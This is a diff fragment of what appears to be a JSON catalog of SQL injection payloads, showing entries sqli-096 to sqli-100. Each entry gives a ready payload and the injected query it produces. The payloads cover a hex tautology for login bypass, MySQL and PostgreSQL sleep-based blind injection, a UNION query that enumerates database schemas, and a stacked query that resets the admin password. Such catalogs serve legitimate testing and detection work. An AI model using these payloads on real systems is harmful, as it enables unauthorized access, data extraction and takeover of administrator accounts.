+  {
+    "id": "sqli-096",
+    "description": "Using OR with hex encoded tautology with double dash comment",
+    "payload": "' OR 0x43=0x43--",
+    "context": "Login username",
+    "type": "tautology",
+    "severity": "medium",
+    "example_query": "SELECT * FROM users WHERE username = '' OR 0x43=0x43--"
+  },
+  {
+    "id": "sqli-097",
+    "description": "Using OR with sleep for time delay in MySQL with double dash comment",
+    "payload": "' OR SLEEP(14)--",
+    "context": "Search input",
+    "type": "blind-time",
+    "severity": "medium",
+    "example_query": "SELECT * FROM products WHERE name = '' OR SLEEP(14)--"
+  },
+  {
+    "id": "sqli-098",
+    "description": "Using UNION SELECT to extract schema names with double dash comment",
+    "payload": "' UNION SELECT schema_name, NULL FROM information_schema.schemata--",
+    "context": "Search input",
+    "type": "union",
+    "severity": "high",
+    "example_query": "SELECT name, description FROM products WHERE name = '' UNION SELECT schema_name, NULL FROM information_schema.schemata--"
+  },
+  {
+    "id": "sqli-099",
+    "description": "Using OR with sleep for time delay in PostgreSQL with double dash comment",
+    "payload": "' OR pg_sleep(15)--",
+    "context": "ID parameter",
+    "type": "blind-time",
+    "severity": "medium",
+    "example_query": "SELECT * FROM orders WHERE id = '' OR pg_sleep(15)--"
+  },
+  {
+    "id": "sqli-100",
+    "description": "Using stacked queries to update admin password with double dash comment",
+    "payload": "'; UPDATE users SET password='securepass' WHERE username='admin'--",
+    "context": "User input",
+    "type": "stacked-queries",
+    "severity": "critical",
+    "example_query": "SELECT * FROM users WHERE username = ''; UPDATE users SET password='securepass' WHERE username='admin'--"
+  }
+]
